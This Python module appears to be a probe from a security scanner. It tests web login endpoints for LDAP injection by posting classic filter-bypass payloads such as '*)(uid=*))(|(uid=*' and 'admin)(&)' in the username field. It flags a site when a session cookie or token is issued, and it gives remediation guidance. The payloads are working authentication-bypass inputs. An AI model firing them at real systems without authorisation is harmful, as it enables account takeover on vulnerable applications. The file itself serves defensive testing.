#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
LDAP injection: login filter built by string concatenation accepts
classic always-true filter payloads.

Apps that authenticate against an LDAP directory often build the
search filter by string-concatenation:
``(&(uid=$user)(userPassword=$pw))``. Without proper escaping of
``)``, ``(``, ``*``, ``\\``, an attacker injects extra filter
clauses that short-circuit the predicate. The two classic payloads:

  * ``*)(uid=*))(|(uid=*`` — expands to a nested filter with an
    OR alternative that always matches one entry.
  * ``admin)(&)`` — closes the filter early; the server resolves
    the username clause alone and ignores the password check.

This probe POSTs each payload to common login endpoints and only
flags the endpoint when TWO corroborating signals align:

  * HTTP 200 response (not 401 / 403 / generic-error).
  * A session cookie was issued OR an auth token was returned in
    the response body (tokens, JWTs, or a Set-Cookie of a
    session-shaped name).

The payloads are crafted to never escape the LDAP filter scope —
they short-circuit auth but execute no commands.

Detection signal:
  POST login with an injected payload in the username field;
  response is 200 AND a session cookie / auth token is set.
"""
from __future__ import annotations

import json
import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Common login endpoints. Try in priority order — first match wins.
LOGIN_PATHS = (
    "/rest/user/login",
    "/api/login",
    "/api/auth/login",
    "/api/v1/login",
    "/login",
    "/auth/login",
    "/user/login",
    "/api/users/login",
)

# (label, payload) pairs. Only the username carries the injection;
# the password is a fixed, obviously-wrong sentinel. A successful
# auth here can ONLY be the result of the filter short-circuiting.
PAYLOADS = (
    ("filter_or_alt",     "*)(uid=*))(|(uid=*"),
    ("filter_close_amp",  "admin)(&)"),
    ("filter_wildcard",   "*)(&"),
)

# Names that look like session cookies on Set-Cookie. We match
# loosely (case-insensitive) but require the name itself, never
# bare "id=" — too generic.
SESSION_COOKIE_RE = re.compile(
    r"\b(jsessionid|phpsessid|asp\.net_sessionid|connect\.sid|"
    r"sid|sessionid|session|auth|token|access_token)\s*=",
    re.I,
)

# Body-level token signature. JWT shape (3 base64url segments) or
# explicit `"token": "..."` / `"accessToken": "..."` JSON keys.
TOKEN_BODY_PATTERNS = (
    re.compile(r'"(?:access_)?token"\s*:\s*"[A-Za-z0-9._\-]{20,}"'),
    re.compile(r'"authentication"\s*:\s*\{[^}]*"token"\s*:\s*"'),
    re.compile(r"\beyJ[A-Za-z0-9_\-]{10,}\."
                r"[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b"),
)


def _has_session_cookie(headers: dict) -> str | None:
    """Returns the matching Set-Cookie header value when one of the
    response's cookies looks session-shaped, else None."""
    for k, v in headers.items():
        if k.lower() != "set-cookie":
            continue
        if SESSION_COOKIE_RE.search(v or ""):
            return v
    return None


def _has_auth_token(text: str) -> str | None:
    """Returns a short matched fragment when the response body
    carries a token-shaped value, else None."""
    if not text:
        return None
    for pat in TOKEN_BODY_PATTERNS:
        m = pat.search(text)
        if m:
            return m.group(0)[:80]
    return None


class LdapInjectionLoginBypassProbe(Probe):
    name = "ldap_injection_login_bypass"
    summary = ("Detects LDAP-injection in login filters via classic "
               "filter-bypass payloads — flags only when 200 + "
               "session cookie / auth token are issued.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--login-path", action="append", default=[],
            help="Additional login endpoint to probe (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(LOGIN_PATHS) + list(args.login_path or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        for p in paths:
            for label, payload in PAYLOADS:
                # Send both `username` and `email` keys — different
                # apps use different field names; the LDAP backend
                # only sees whichever one the filter is built from.
                body = json.dumps({
                    "username": payload,
                    "email": payload,
                    # Fixed wrong password — an honest check rejects it.
                    "password": "definitely-not-the-password",
                }).encode()
                r = client.request(
                    "POST", urljoin(origin, p),
                    headers={"Content-Type": "application/json"},
                    body=body)
                cookie_hit = _has_session_cookie(r.headers)
                token_hit = _has_auth_token(r.text)
                row: dict = {"path": p, "label": label,
                              "status": r.status, "size": r.size,
                              "session_cookie": bool(cookie_hit),
                              "auth_token": bool(token_hit)}
                if (r.status == 200 and (cookie_hit or token_hit)):
                    if cookie_hit:
                        # Mask everything past the cookie name= so we
                        # never persist the actual session value.
                        row["cookie_excerpt"] = (
                            cookie_hit.split(";")[0][:24] + "***")
                    if token_hit:
                        row["token_excerpt"] = (
                            token_hit[:20] + "***" + token_hit[-6:])
                    confirmed = row
                    attempts.append(row)
                    break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.92,
                summary=(
                    f"Confirmed: LDAP injection at {origin}"
                    f"{confirmed['path']}. Payload "
                    f"`{confirmed['label']}` produced HTTP 200 and "
                    "the response set a session cookie / auth token "
                    "despite using a fixed-wrong password — the LDAP "
                    "filter was short-circuited by the injected "
                    "metacharacters."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Stop concatenating user input into LDAP filters. "
                    "Escape every input via the directory client's "
                    "filter-escape helper:\n"
                    "  - Java: `Filter.encode(value)` (Spring LDAP) or "
                    "`LdapEncoder.filterEncode(value)`.\n"
                    "  - Python (ldap3): `ldap3.utils.conv.escape_filter_chars`.\n"
                    "  - .NET: `System.DirectoryServices.Protocols` "
                    "with parameterized filters; never `string.Format`.\n"
                    "  - Node (ldapjs): use the parsed filter API "
                    "(`new EqualityFilter(...)`) instead of building "
                    "a string.\n"
                    "Required escapes: `(` `)` `*` `\\\\` and NUL."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tried {len(attempts)} LDAP injection "
                     f"payload/path combinations on {origin}; none "
                     "produced 200 + session/token issuance."),
            evidence=evidence,
        )


if __name__ == "__main__":
    LdapInjectionLoginBypassProbe().main()
